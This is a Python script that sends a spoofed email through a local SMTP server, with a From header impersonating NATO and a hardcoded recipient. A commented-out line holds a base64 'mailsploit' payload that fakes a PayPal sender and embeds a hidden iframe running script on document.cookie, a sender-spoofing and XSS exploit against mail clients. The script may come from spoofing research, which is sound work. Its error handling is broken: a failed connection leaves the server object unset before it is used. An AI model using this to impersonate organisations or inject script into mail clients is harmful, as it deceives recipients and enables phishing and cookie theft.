import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import make_msgid, formataddr

from lazyme.string import color_print
from vals import nato_example, nato_example2_body, nato_example2_subject
from email.message import EmailMessage
from email.headerregistry import Address

# spoofed_display_name = "עבריתעבריתעבריתעבריתעברית"
spoofed_display_name = "gowno"

# spoofed_from = "=?utf-8?b?c2VydmljZUBwYXlwYWwuY29tPGlmcmFtZSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9aHR0cHM6Ly93d3cuaHVzaG1haWwuY29tIHN0eWxlPSJkaXNwbGF5Om5vbmUi?==?utf-8?Q?=0A=00?=@mailsploit.com"
spoofed_from = "aaaa@pwr.edu.pl"

email_to = 'wliebert0316@gems.sw.rim.net'

msg = MIMEMultipart('html')
msg['Subject'] = nato_example2_subject  # 'Our family reunion'
msg['From'] = formataddr(('NATO 1', '<nato@nato.com>'))
msg['To'] = email_to
msg.preamble = 'Our family reunion'
asparagus_cid = make_msgid()

# part1 = MIMEText(nato_example2_body, 'html', _charset='utf-8')
part1 = MIMEMultipart()
msg.attach(part1)

SMTP_user = 'user@localhost'
SMTP_password = 'user'
server = None

# with smtplib.SMTP('localhost') as s:
#     s.send_message(msg)

try:
    server = smtplib.SMTP('localhost', 25)
    server.ehlo()   # optional
except:
    color_print('Can\'t connect to SMTP', color='blue')
server.set_debuglevel(1)

try:
    server.login(SMTP_user, SMTP_password)
except:
    color_print('Can\'t authenticate with the server', color='blue')

try:
    # server.sendmail(spoofed_from, [email_to], msg)
    server.send_message(msg)
except:
    color_print('Can\'t send an email', color='blue')

server.quit()